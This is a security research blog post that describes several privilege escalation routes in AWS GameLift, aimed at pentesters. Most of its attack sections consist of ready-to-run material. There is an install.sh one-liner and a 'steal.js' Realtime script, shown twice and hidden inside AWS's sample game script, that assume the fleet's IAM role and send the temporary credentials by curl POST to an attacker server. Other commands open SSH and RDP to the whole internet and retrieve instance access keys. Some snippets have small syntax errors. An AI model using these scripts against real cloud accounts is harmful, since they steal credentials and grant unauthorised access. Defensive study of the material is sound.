---
title: "AWS GameLift: One more way to escalate privileges (Part 1)"
date: 2023-12-18 17:45:00 +0100
categories: [Research]
tags: [cloud, aws, gamelift, privesc]
---

## Intro

Cloud providers are always working on improvements and adding more specific services to their platforms. The services extend an attack surface in cloud environments and can be overlooked during security assessments because there is no available information on how to assess them from an attacker’s perspective.
This post will cover several new privilege escalation routes we discovered in AWS GameLift services - a service that allows Amazon clients to deploy, operate, and scale dedicated, low-cost servers in the cloud for session-based multiplayer games.

## **What is GameLift? Intro to Gamelift**

Amazon GameLift provides a platform to host multiplayer games in the cloud. The service makes running and scaling game servers in the cloud easier.

GameLift runs game servers using the following building blocks: **Fleets**, **Builds**, and **Scripts**.

- **Fleet** - A collection of computer resources that run your game servers and host game sessions for your players. There are several hosting options for a game:
    - **Amazon GameLift Anywhere** - host games on any hardware with the benefit of Amazon GameLift management tools.
    - **Amazon GameLift FleetIQ** - works directly with hosting resources in Amazon EC2 and Amazon EC2 Auto Scaling.
    - **Managed Amazon GameLift** - has two options:
        - **Custom servers** – Amazon GameLift hosts your custom server that runs your game server binary.
        - **Realtime Servers** – Amazon GameLift hosts your lightweight game server.
    
    All identified privilege escalation methods that are introduced below relate to both **Managed Amazon GameLift** options.
    
- **Build** – a custom-built game server software that runs on Amazon GameLift and hosts game sessions for your players. A game build includes game server binaries, dependencies, and an installation script that handle tasks that install your game build on GameLift fleet. For more information, see [docs](https://docs.aws.amazon.com/gamelift/latest/developerguide/gamelift-build-cli-uploading.html).
- **Script** – a JavaScript code that allows developers to configure custom game logic on lightweight Realtime Servers to host game sessions for your players. For more information, see [docs](https://docs.aws.amazon.com/gamelift/latest/developerguide/realtime-script-uploading.html).

## Gamelift **Escalation Methods**

### iam:PassRole, gamelift:CreateFleet, (gamelift:UploadBuild | gamelift:CreateBuild)

Just like with EC2 instance, you can attach a role to a fleet during creation using the `iam:PassRole` action. Fleets do not have a metadata service like EC2 or ECS. To assume the attached role, you need to perform a `sts:AssumeRole` action on it (see [docs](https://docs.aws.amazon.com/gamelift/latest/developerguide/gamelift-sdk-server-resources.html)).

To steal the temporary credentials of an attached Gamelift role, an attacker just needs to upload a build that will assume the role and exfiltrate, for example via `curl`, to an attacker-controlled server. The malicious build does not have to contain any working game binaries or dependencies since an installation script (`install.sh` for Linux or `install.bat` for Windows-based machines) runs before any binary file validation (see [docs](https://docs.aws.amazon.com/gamelift/latest/developerguide/gamelift-build-cli-uploading.html)).

Find the below commands to create a build directory with install.sh script. Set AWS_ROLE_ARN with a role to assume and EXFIL_URL with the address of your server:

```bash
mkdir build                                                       
export AWS_ROLE_ARN=arn:aws:iam::123456789012:role/EXAMPLE_ROLE
export EXFIL_URL=http://your.server/  
echo "aws sts assume-role --role-arn $AWS_ROLE_ARN --role-session-name PrivEscExample | curl -X POST --data-binary @- $EXFIL_URL" > ./build/install.sh
```

Then upload a created `build` to the AWS account. Use either `upload-build` or `create-build` depending on permissions you have.

Example of `upload-build` command:

```bash
aws gamelift upload-build \
    --name PrivEscExploit \
    --build-version 0.0.1 \
    --build-root ./build --operating-system AMAZON_LINUX_2
```

`create-build` works differently. It returns temporary credentials that you need to use to upload the zip archive of `build` directory to a Gamelift bucket. Use the following commands:

```bash
aws gamelift create-build \
    --name PrivEscExploit \
    --build-version 0.0.1 \
    --operating-system AMAZON_LINUX_2

# set obtained temporary credentials as env variables 
export AWS_ACCESS_KEY_ID=
export AWS_SECRET_ACCESS_KEY=
export AWS_SESSION_TOKEN=

# zip your install.sh file
zip build.zip ./build/install.sh

# upload zip to the bucket key from create-build command output 
aws s3 cp ./build.zip s3://prod-gamescale-builds-us-east-1/123456789012/build-1111aaaa-22bb-33cc-44dd-5555eeee66ff
```

Finally, create a fleet with the uploaded build and wait for temporary credentials to be sent on your server. Remember to set your `BUILD_ID`.

```bash
export BUILD_ID=build-1111aaaa-22bb-33cc-44dd-5555eeee66ff
aws gamelift create-fleet \
    --name PrivEscExploit \
    --description 'PrivEsc demonstration' \
    --build-id $BUILD_ID \
    --ec2-instance-type c4.large \
    --fleet-type ON_DEMAND \
    --runtime-configuration 'ServerProcesses=[{LaunchPath=/local/game/release-na/MegaFrogRace_Server.exe,ConcurrentExecutions=1}]' \
    --instance-role-arn $AWS_ROLE_ARN
```

**Potential Impact:** Direct privilege escalation to any Gamelift role.

### iam:PassRole, gamelift:CreateFleet, (gamelift:CreateScript | gamelift:UpdateScript)

Another option to create a fleet is by using the Realtime Servers option. This option runs a lightweight game server and lets developers modify its configuration and behavior using scripts written in JavaScript.

Similar to build exploitation, an attacker needs to create a JavaScript file that will assume a role attached to a fleet. To ensure that the malicious script will be successfully launched by Realtime Server, an attacker can modify an example script provided by AWS in the docs.

Example of the `steal.js` file. Remember to set your own `exfilURL`: 

```jsx
const exfilURL = "http://your.server/"

// Exploit part
const cp = require("child_process");
const fs = require('fs');
const os = require('os');

function readJsonFile(filePath) {
  try {
    const data = fs.readFileSync(filePath, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error reading or parsing JSON file:', error.message);
    return null;
  }
}
var pathToMetadata = "";
if (os.platform == "linux") {
    pathToMetadata = '/local/gamemetadata/gamelift-metadata.json';
  } else {
    pathToMetadata = 'C:\\GameMetadata\\gamelift-metadata.json';
} 
const jsonObject = readJsonFile(pathToMetadata);

const assume_role_cmd = `aws sts assume-role --role-arn ${jsonObject.instanceRoleArn} --role-session-name PrivEsc | curl -X POST --data-binary @- ${exfilURL}`

cp.exec(assume_role_cmd)

// AWS Realtime script example
'use strict';

const configuration = {
    pingIntervalTime: 30000,
    maxPlayers: 32
};

const tickTime = 1000;

const minimumElapsedTime = 120;

var session;                        // The Realtime server session object
var logger;                         // Log at appropriate level via .info(), .warn(), .error(), .debug()
var startTime;                      // Records the time the process started
var activePlayers = 0;              // Records the number of connected players
var onProcessStartedCalled = false; // Record if onProcessStarted has been called

const OP_CODE_CUSTOM_OP1 = 111;
const OP_CODE_CUSTOM_OP1_REPLY = 112;
const OP_CODE_PLAYER_ACCEPTED = 113;
const OP_CODE_DISCONNECT_NOTIFICATION = 114;

const RED_TEAM_GROUP = 1;
const BLUE_TEAM_GROUP = 2;

function init(rtSession) {
    session = rtSession;
    logger = session.getLogger();
}

function onProcessStarted(args) {
    onProcessStartedCalled = true;
    logger.info("Starting process with args: " + args);
    logger.info("Ready to host games...");

    return true;
}

function onStartGameSession(gameSession) {
    startTime = getTimeInS();
    tickLoop();
}

function onProcessTerminate() {
}

function onHealthCheck() {
    return true;
}

function onPlayerConnect(connectMsg) {
    return true;
}

function onPlayerAccepted(player) {
    const msg = session.newTextGameMessage(OP_CODE_PLAYER_ACCEPTED, player.peerId,
                                             "Peer " + player.peerId + " accepted");
    session.sendReliableMessage(msg, player.peerId);
    activePlayers++;
}

function onPlayerDisconnect(peerId) {
    const outMessage = session.newTextGameMessage(OP_CODE_DISCONNECT_NOTIFICATION,
                                                session.getServerId(),
                                                "Peer " + peerId + " disconnected");
    session.getPlayers().forEach((player, playerId) => {
        if (playerId != peerId) {
            session.sendReliableMessage(outMessage, playerId);
        }
    });
    activePlayers--;
}

function onMessage(gameMessage) {
    switch (gameMessage.opCode) {
      case OP_CODE_CUSTOM_OP1: {
        const outMessage = session.newTextGameMessage(OP_CODE_CUSTOM_OP1_REPLY, session.getServerId(), gameMessage.payload);
        session.sendGroupMessage(outMessage, RED_TEAM_GROUP);
        break;
      }
    }
}

function onSendToPlayer(gameMessage) 
    return (!gameMessage.getPayloadAsText().includes("Reject"));
}

function onSendToGroup(gameMessage) {
    return true;
}

function onPlayerJoinGroup(groupId, peerId) {
    return true;
}

function onPlayerLeaveGroup(groupId, peerId) {
    return true;
}

async function tickLoop() {
    const elapsedTime = getTimeInS() - startTime;
    logger.info("Tick... " + elapsedTime + " activePlayers: " + activePlayers);

    if ( (activePlayers == 0) && (elapsedTime > minimumElapsedTime)) {
        logger.info("All players disconnected. Ending game");
        const outcome = await session.processEnding();
        logger.info("Completed process ending with: " + outcome);
        process.exit(0);
    }
    else {
        setTimeout(tickLoop, tickTime);
    }
}

function getTimeInS() {
    return Math.round(new Date().getTime()/1000);
}

exports.ssExports = {
    configuration: configuration,
    init: init,
    onProcessStarted: onProcessStarted,
    onMessage: onMessage,
    onPlayerConnect: onPlayerConnect,
    onPlayerAccepted: onPlayerAccepted,
    onPlayerDisconnect: onPlayerDisconnect,
    onSendToPlayer: onSendToPlayer,
    onSendToGroup: onSendToGroup,
    onPlayerJoinGroup: onPlayerJoinGroup,
    onPlayerLeaveGroup: onPlayerLeaveGroup,
    onStartGameSession: onStartGameSession,
    onProcessTerminate: onProcessTerminate,
    onHealthCheck: onHealthCheck
};
```

Then upload the zipped script to AWS account using `create-script` command:

```bash
zip script.zip steal.js

aws gamelift create-script \
    --name PrivEscExploit \
    --script-version 0.0.1 \
    --zip-file fileb://script.zip
```

Unlike builds, you can update existing script with new files. Use the `update-script` command with existing `script-id` in this account if you do not have permission to use `create-script`:

```bash
zip script.zip steal.js

export SCRIPT_ID=script-1111aaaa-22bb-33cc-44dd-5555eeee66ff
aws gamelift update-script
		--script-id $SCRIPT_ID \
		--zip-file fileb://script.zip
```

At the end, create a fleet with the uploaded script and wait for temporary credentials to be sent on your server. Remember to set your `SCRIPT_ID` and `AWS_ROLE_ARN`:

```bash
export SCRIPT_ID=script-1111aaaa-22bb-33cc-44dd-5555eeee66ff
export AWS_ROLE_ARN=arn:aws:iam::123456789012:role/EXAMPLE_ROLE
aws gamelift create-fleet \
    --name PrivEscExploit \
    --description 'PrivEsc demonstration' \
    --script-id $SCRIPT_ID \
    --ec2-instance-type c4.large \
    --fleet-type ON_DEMAND \
    --runtime-configuration 'ServerProcesses=[{LaunchPath=/local/game/steal.js, ConcurrentExecutions=1}]' \
    --instance-role-arn $AWS_ROLE_ARN
```

**Potential Impact:** Direct privilege escalation to any Gamelift role.

### iam:PassRole, gamelift:CreateFleet, (gamelift:GetInstanceAccess | gamelift:GetComputeAccess)

Even if you do not have permissions to create a malicious build(`UploadBuild` or `CreateBuild`) or a script(`CreateScript` or `UpdateScript`)to steal temporary credentials of an attached role, you still can try to obtain them by connecting to a fleet via SSH. Gamelift allows developers to connect to fleet instances after their activation for debug purposes. An attacker can leverage remote access to a fleet instance to obtain a Gamelift role.

First, create a fleet with a Gamelift role you want to obtain and with opened SSH and RDP (for `Windows` builds) ports using  `--ec2-inbound-permissions` option.

You can use either existing builds or scripts, but the example below uses a script to run a fleet:

```bash
export SCRIPT_ID=script-1111aaaa-22bb-33cc-44dd-5555eeee66ff
aws gamelift create-fleet \
    --name PrivEscExploit \
    --description 'PrivEsc demonstration' \
    --script-id $SCRIPT_ID \
    --ec2-instance-type c4.large \
    --fleet-type ON_DEMAND \
		--ec2-inbound-permissions '[{"FromPort":22,"ToPort": 22,"IpRange": "0.0.0.0/0", "Protocol": "TCP"}, {"FromPort":3389,"ToPort": 3389,"IpRange": "0.0.0.0/0", "Protocol": "TCP"}]' \
		--runtime-configuration 'ServerProcesses=[{LaunchPath=/LaunchPath=/local/game/init.js,ConcurrentExecutions=1}]' \
    --instance-role-arn $AWS_ROLE_ARN
```

Fleets that are created with scripts successfully activate even though `runtime-configuration` parameters are invalid.

If there are no scripts in the target’s AWS account that you can use to run a fleet and you are forced to use custom builds, you should try to find a `runtime-configuration` parameters for a build you are trying to run. If you are not able to locate any, you can try to run it without `—-runtime-configuration` option and see whether it has been activated successfully with default parameters.

You can try to find and use a sample game build provided by Amazon on the target AWS account. Its name is `SampleCustomGameFleet` by default and it has next `runtime-configuration` parameters:

```jsx
--runtime-configuration 'ServerProcesses=[{LaunchPath=/LaunchPath=C:\game\Bin64vc141.Release.Dedicated\MultiplayerSampleLauncher_Server.exe,Parameters=+sv_port 33435 +gamelift_start_server +gm_netsec_enable 0,ConcurrentExecutions=1}]' 
```

Then after successful fleet activation, obtain credentials via `get-instance-access`:

```bash
export FLEET_ID=fleet-d478517d-10df-4923-892f-d765cd6ec54e 
export INSTANCE_ID=i-09f1b3e73d700767
aws gamelift get-instance-access --fleet-id $FLEET_ID --instance-id $INSTANCE_ID
```

Example of the command output with credentials (username and SSH private key for Linux):

```json
{
    "InstanceAccess": {
        "FleetId": "fleet-d478517d-10df-4923-892f-d765cd",
        "InstanceId": "i-09f1b3e73d700767",
        "IpAddress": "3.81.52.210",
        "OperatingSystem": "AMAZON_LINUX_2",
        "Credentials": {
            "UserName": "gl-user-remote",
            "Secret": "-----BEGIN RSA PRIVATE KEY-----\n ... n-----END RSA PRIVATE KEY-----\n"
        }
    }
}
```

Finally, use the credentials to connect to the instance via SSH or RDP and assume Gamelift role using assume-role command on the instance:

```bash
aws sts assume-role --role-arn AWS_ROLE_ARN --role-session-name PrivEscExample
```

If you need more details on how to connect to a fleet, read [here](https://docs.aws.amazon.com/gamelift/latest/developerguide/fleets-remote-access.html).

In addition to `get-instance-access` command, you can use a `get-compute-access` as long as the created fleet is based on a build with SDK version 5. Just use an instance ID for `--compute-name` option:

```bash
export FLEET_ID=fleet-d478517d-10df-4923-892f-d765cd6ec54e
export INSTANCE_ID=i-09f1b3e73d700767
aws gamelift get-compute-access --fleet-id $FLEET_ID --compute-name $INSTANCE_ID 
```

It will return set of temporary credentials that you can use to access credentials via `ssm start-session` command:

```bash
export AWS_ACCESS_KEY_ID=
export AWS_SECRET_ACCESS_KEY=
export AWS_SESSION_TOKEN=

aws ssm start-session --target $INSTANCE_ID
```

**Potential Impact:** Direct privilege escalation to any Gamelift role.

### gamelift:UpdateFleetPortSettings, gamelift:GetInstanceAccess | gamelift:GetComputeAccess

Providing that you do not have either `iam:PassRole` or `gamelift:CreateFleet` permission, you still can steal temporary credentials from an active fleet that has a Gamelift role attached..

One of the ways to obtain credentials from an active fleet is to connect via SSH.

You can do it via `get-instance-access` as described in the previous privilege escalation method. Unless you are lucky to find a developer or debugging fleet that already has SSH or RDP ports open, you will need to modify the fleet’s port settings to make it accessible for connection.

To do so, you need to run `update-fleet-port-settings` command against fleet:

```bash
export FLEET_ID=fleet-d478517d-10df-4923-892f-d765cd6ec54e
aws gamelift update-fleet-port-settings 
		--fleet-id $FLEET_ID
		--inbound-permission-authorizations='[{"FromPort":22,"ToPort": 22,"IpRange": "0.0.0.0/0", "Protocol": "TCP"}, {"FromPort":3389,"ToPort": 3389,"IpRange": "0.0.0.0/0", "Protocol": "TCP"}]'
```

Once the port is open, obtain credentials via `get-instance-access` and use it to connect (see previous method for more details):

```bash
export INSTANCE_ID=i-09f1b3e73d700767
aws gamelift get-instance-access --fleet-id $FLEET_ID --instance-id $INSTANCE_ID
```

You can use a `get-compute-access` providing that the active fleet is based on a build with SDK version 5.

```bash
export FLEET_ID=fleet-d478517d-10df-4923-892f-d765cd6ec54e
export INSTANCE_ID=i-09f1b3e73d700767
aws gamelift get-compute-access --fleet-id $FLEET_ID --compute-name $INSTANCE_ID 
```

This returns a set of temporary credentials to connect via `ssm start-session` command, so you do not need to modify fleet’s port settings with `update-fleet-port-settings` command.

```bash
export AWS_ACCESS_KEY_ID=
export AWS_SECRET_ACCESS_KEY=
export AWS_SESSION_TOKEN=

aws ssm start-session --target $INSTANCE_ID
```

**Potential Impact:** Privilege escalation to a different role attached to an active Gamelift fleet.

### gamelift:UpdateScript

Another way to sneak into script-based fleets is to update a script that is currently used by working fleets. According to AWS [documentation](https://docs.aws.amazon.com/gamelift/latest/apireference/API_UpdateScript.html), “once the script is updated and acquired by a fleet instance, the new version is used for all new game sessions.” This means a malicious script uploaded by an attacker will be started by the fleet after update.

Example of the malicious `steal.js` script. Remember to set your own `exfilURL`: 

```jsx
const exfilURL = "http://your.server/"

// Exploit part
const cp = require("child_process");
const fs = require('fs');
const os = require('os');

function readJsonFile(filePath) {
  try {
    const data = fs.readFileSync(filePath, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error reading or parsing JSON file:', error.message);
    return null;
  }
}
var pathToMetadata = "";
if (os.platform == "linux") {
    pathToMetadata = '/local/gamemetadata/gamelift-metadata.json';
  } else {
    pathToMetadata = 'C:\\GameMetadata\\gamelift-metadata.json';
} 
const jsonObject = readJsonFile(pathToMetadata);

const assume_role_cmd = `aws sts assume-role --role-arn ${jsonObject.instanceRoleArn} --role-session-name PrivEsc | curl -X POST --data-binary @- ${exfilURL}`

cp.exec(assume_role_cmd)

// AWS Realtime script example
'use strict';

const configuration = {
    pingIntervalTime: 30000,
    maxPlayers: 32
};

const tickTime = 1000;

const minimumElapsedTime = 120;

var session;                        // The Realtime server session object
var logger;                         // Log at appropriate level via .info(), .warn(), .error(), .debug()
var startTime;                      // Records the time the process started
var activePlayers = 0;              // Records the number of connected players
var onProcessStartedCalled = false; // Record if onProcessStarted has been called

const OP_CODE_CUSTOM_OP1 = 111;
const OP_CODE_CUSTOM_OP1_REPLY = 112;
const OP_CODE_PLAYER_ACCEPTED = 113;
const OP_CODE_DISCONNECT_NOTIFICATION = 114;

const RED_TEAM_GROUP = 1;
const BLUE_TEAM_GROUP = 2;

function init(rtSession) {
    session = rtSession;
    logger = session.getLogger();
}

function onProcessStarted(args) {
    onProcessStartedCalled = true;
    logger.info("Starting process with args: " + args);
    logger.info("Ready to host games...");

    return true;
}

function onStartGameSession(gameSession) {
    startTime = getTimeInS();
    tickLoop();
}

function onProcessTerminate() {
}

function onHealthCheck() {
    return true;
}

function onPlayerConnect(connectMsg) {
    return true;
}

function onPlayerAccepted(player) {
    const msg = session.newTextGameMessage(OP_CODE_PLAYER_ACCEPTED, player.peerId,
                                             "Peer " + player.peerId + " accepted");
    session.sendReliableMessage(msg, player.peerId);
    activePlayers++;
}

function onPlayerDisconnect(peerId) {
    const outMessage = session.newTextGameMessage(OP_CODE_DISCONNECT_NOTIFICATION,
                                                session.getServerId(),
                                                "Peer " + peerId + " disconnected");
    session.getPlayers().forEach((player, playerId) => {
        if (playerId != peerId) {
            session.sendReliableMessage(outMessage, playerId);
        }
    });
    activePlayers--;
}

function onMessage(gameMessage) {
    switch (gameMessage.opCode) {
      case OP_CODE_CUSTOM_OP1: {
        const outMessage = session.newTextGameMessage(OP_CODE_CUSTOM_OP1_REPLY, session.getServerId(), gameMessage.payload);
        session.sendGroupMessage(outMessage, RED_TEAM_GROUP);
        break;
      }
    }
}

function onSendToPlayer(gameMessage) 
    return (!gameMessage.getPayloadAsText().includes("Reject"));
}

function onSendToGroup(gameMessage) {
    return true;
}

function onPlayerJoinGroup(groupId, peerId) {
    return true;
}

function onPlayerLeaveGroup(groupId, peerId) {
    return true;
}

async function tickLoop() {
    const elapsedTime = getTimeInS() - startTime;
    logger.info("Tick... " + elapsedTime + " activePlayers: " + activePlayers);

    if ( (activePlayers == 0) && (elapsedTime > minimumElapsedTime)) {
        logger.info("All players disconnected. Ending game");
        const outcome = await session.processEnding();
        logger.info("Completed process ending with: " + outcome);
        process.exit(0);
    }
    else {
        setTimeout(tickLoop, tickTime);
    }
}

function getTimeInS() {
    return Math.round(new Date().getTime()/1000);
}

exports.ssExports = {
    configuration: configuration,
    init: init,
    onProcessStarted: onProcessStarted,
    onMessage: onMessage,
    onPlayerConnect: onPlayerConnect,
    onPlayerAccepted: onPlayerAccepted,
    onPlayerDisconnect: onPlayerDisconnect,
    onSendToPlayer: onSendToPlayer,
    onSendToGroup: onSendToGroup,
    onPlayerJoinGroup: onPlayerJoinGroup,
    onPlayerLeaveGroup: onPlayerLeaveGroup,
    onStartGameSession: onStartGameSession,
    onProcessTerminate: onProcessTerminate,
    onHealthCheck: onHealthCheck
};
```

You need to obtain a launch path which has been used during`create-fleet`  operation and locate your malicious script in a zipped directory accordingly.

Then upload the zipped `steals.js` script using  `update-script` command with the `script-id` which is used for an active fleet. After some time, you will receive temporary credentials from compromised fleets on your server.

```bash
zip script.zip steal.js 

export SCRIPT_ID=script-1111aaaa-22bb-33cc-44dd-5555eeee66ff
aws gamelift update-script
		--script-id $SCRIPT_ID \
		--zip-file fileb://script.zip
```

**Potential Impact:** Privilege escalation to a different role attached to an active Gamelift fleet with Realtime Server.

## Conclusions

Pentesters will not encounter the AWS GameLift service in each environment because it is used only for multiplayer games. Regardless, AWS security best practices for such highly specialized services should not be overlooked during security assessments, especially protection against potential privilege escalation attacks.
We hope this article will help you in your future assessments. Stay tuned for the second part of the GameLift security review where we explore how to enumerate, persist, and exploit the service.

## References

[https://docs.aws.amazon.com/gamelift/latest/apireference/Welcome.html](https://docs.aws.amazon.com/gamelift/latest/apireference/Welcome.html)

[https://docs.aws.amazon.com/cli/latest/reference/gamelift/index.html#cli-aws-gamelift](https://docs.aws.amazon.com/cli/latest/reference/gamelift/index.html#cli-aws-gamelift)

[https://docs.aws.amazon.com/gamelift/latest/developerguide/gamelift-intro.html](https://docs.aws.amazon.com/gamelift/latest/developerguide/gamelift-intro.html)
